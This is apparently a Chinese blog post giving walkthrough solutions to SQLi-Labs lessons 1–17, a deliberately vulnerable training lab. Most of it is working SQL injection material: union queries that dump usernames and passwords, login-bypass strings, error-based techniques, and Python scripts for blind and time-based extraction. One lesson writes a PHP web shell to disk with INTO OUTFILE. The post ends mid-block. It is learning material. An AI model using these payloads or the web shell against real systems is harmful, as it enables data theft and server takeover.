<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lethe">


    <meta name="subtitle" content="Life is a struggle">


    <meta name="description" content="Lethe's Blog">


    <meta name="keywords" content="Lethe's Blog">


<title>SQLi-Labs通关笔记 | Lethe&#39;s Blog</title>



    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/blog/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/blog/js/script.js"></script>
    
    <script src="/blog/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/blog/">Lethe&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/blog/archives">Posts</a>
                
                    <a class="menu-item" href="/blog/category">Categories</a>
                
                    <a class="menu-item" href="/blog/tag">Tags</a>
                
                    <a class="menu-item" href="/blog/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/blog/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/blog/archives">Posts</a>
                
                    <a class="menu-item" href="/blog/category">Categories</a>
                
                    <a class="menu-item" href="/blog/tag">Tags</a>
                
                    <a class="menu-item" href="/blog/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">SQLi-Labs通关笔记</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">July 26, 2019&nbsp;&nbsp;21:53:40</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/blog/categories/System-Security/">System Security</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p><code>?id=1&#39;</code> 单引号报错，存在注入</p>
<p><code>?id=1&#39; order by 4 %23&#39;</code>报错，存在三列</p>
<p><code>?id=-1&#39; union select 1,2,3%23</code> 发现2和3的位置可以回显，于是进行注入</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code><br>得到当前库下所有表名</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3%23</code><br>得到users表下的所有列名</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code><br>得到所有的username和password<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190716215108803.png" alt="在这里插入图片描述"></p>
<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>less-1用单引号闭合了，而这里的id是整型，其他的注入方法与less-1相同。</p>
<p>最终payload：<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>
<br>

<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>区别是这里用<code>&#39;)</code>进行闭合</p>
<p>最终payload：<br><code>?id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code><br><br></p>
<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>区别是这里用<code>&quot;)</code>进行闭合</p>
<p>最终payload：<br><code>?id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>
<br>

<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>发现有回显”You are in………..”和不回显两种情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1%23   You are in...........</span><br><span class="line">?id=1&#x27; and 1=2%23  不回显</span><br></pre></td></tr></table></figure>
<p>判断为盲注，这里可以直接用sqlmap跑出来，但为了学习，还是自己写个脚本吧！</p>
<p>脚本如下，只跑了一下库名，其他的类似，改一下payload即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bool-base script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-5/&#x27;</span></span><br><span class="line">payloads = <span class="string">&#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1&#x27; and substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1&#x27; and substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;%23&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>同样是bool盲注，双引号报错，判断为双引号闭合，将less-5的脚本中payload的单引号改为双引号即可。<br><br></p>
<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>测试发现<code>id=1&#39;</code>报错，但把后面的语句注释掉扔报错，还有括号闭合，发现加两个括号判断为<code>((&#39;$id&#39;))</code>闭合。<br>根据提示Use outfile……，应该是具有导出什么的了。</p>
<p>（1）首先判断是否有权限：<br><code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code><br>没有报错，具有root权限。<br>（2）于是将数据导出：<br><code>?id=-1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;E:\\CTF\\less-7\\table.txt&quot;--+</code><br>导出所有表</p>
<p><code>?id=-1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) into outfile &quot;E:\\CTF\\less-7\\column.txt&quot;--+</code><br>导出user表中所有列名</p>
<p><code>?id=-1&#39;)) union select 1,2,(select group_concat(username,password) from users) into outfile &quot;E:\\CTF\\less-7\\data.txt&quot;--+</code><br>导出用户名和密码</p>
<p>注意：在Mysql中，需要注意路径转义的问题，即用<code>\\</code>分隔。</p>
<p>另一种也可以向根目录下写入一句话木马，再用菜刀连接：<br><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\PHPWAMP_IN3\\wwwroot\\sqli-labs-master\\Less-7\\shell.php&quot;--+</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/2019071720415417.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>单引号闭合的盲注，用less-5的脚本跑一下即可。<br><br></p>
<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p>发现页面无论对错都只回显<code>You are in...........</code></p>
<p>测试<code>?id=1&#39; and sleep(3)%23</code> 页面会延时3秒再回显，判断为时间盲注</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-9 time-base script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-9/&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1&#x27; and if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(2),1)%23&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1&#x27; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(2),1)%23&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),sleep(2),1)%23&quot;</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            <span class="keyword">break</span>       </span><br></pre></td></tr></table></figure>
<br>

<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>双引号闭合的时间盲注。</p>
<p>稍微改一下less-9的脚本即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-10 script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-10/&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1\&quot; and if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(2),1)%23&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=1\&quot; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(2),1)%23&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1\&quot; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),sleep(2),1)%23&quot;</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            <span class="keyword">break</span>            </span><br></pre></td></tr></table></figure>

<br>

<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>是一个登录框，后端语句为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>所有构造万能密码即可：<br>即Username为<code>1&#39; or 1=1#</code>，Password为任意值。</p>
<p>因为这里是Post方式传到后端，因此注释符只能用<code>#</code><br><br></p>
<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>与上题的区别是这里用<code>(&quot;$uname&quot;)</code>进行闭合</p>
<p>因此构造Username为<code>1&quot;) or 1=1#</code><br><br></p>
<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><p>闭合方式为：<code>(&#39;$uname&#39;)</code></p>
<p>因此构造Username为<code>1&#39;) or 1=1#</code><br><br></p>
<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><p>闭合方式为：<code>&quot;$uname&quot;</code></p>
<p>因此构造Username为<code>1&quot; or 1=1#</code><br><br></p>
<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>字符型POST盲注</p>
<p>构造<code>1&#39; or 1=1#</code>即可登陆</p>
<p>要想通过这个注入出数据，可以写个脚本，但这里回显的语句是图片，不好进行bool盲注，于是考虑时间盲注。</p>
<p>发现构造：<code>1&#39; or sleep(3)#</code>页面会进行延时，所以脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># less-15</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://43.247.91.228:84/Less-15/&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = &#123;&#x27;uname&#x27;:f&quot;1&#x27; or if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;)  ,sleep(2),1)#   &quot; ,&#x27;passwd&#x27;:&#x27;lethe&#x27;,&#x27;submit&#x27;:&#x27;Submit&#x27;&#125;</span></span><br><span class="line">        <span class="comment"># payload = &#123;&#x27;uname&#x27;:f&quot;1&#x27; or if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(2),1)#   &quot; ,&#x27;passwd&#x27;:&#x27;lethe&#x27;,&#x27;submit&#x27;:&#x27;Submit&#x27;&#125;</span></span><br><span class="line">        payload = &#123;<span class="string">&#x27;uname&#x27;</span>:<span class="string">f&quot;1&#x27; or if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),sleep(2),1)#   &quot;</span> ,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;lethe&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>将less-15中的闭合方式改为<code>(&quot;$uname&quot;)</code>即可，其他都一样。</p>
<br>

<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这里用check_input函数对username的值进行了过滤，而对password没有限制，因此考虑构造password。<br>可利用只有Update语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>所以利用报错注入，可以参考这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253">Mysql报错注入总结</a></p>
<p>主要的分为三种方法：</p>
<ul>
<li><p>BIGINT等数据类型溢出</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="keyword">select</span>(<span class="operator">!</span>x<span class="operator">-</span><span class="operator">~</span><span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)a);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="type">BIGINT</span> UNSIGNED <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;((not(&#x27;</span>root<span class="variable">@localhost</span><span class="string">&#x27;)) - ~(0))&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在mysql&gt;5.5.53时，则不能返回查询结果</p>
</li>
<li><p>xpath语法错误</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.7.17~&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.7.17~&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/SQLi-Labs-solutions/20190720204335538.png" alt="在这里插入图片描述"></p>
</li>
<li><p>concat+rand()+group_by()导致主键重复（floor()报错注入）</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;5.5.54-log1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;5.5.54-log1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span 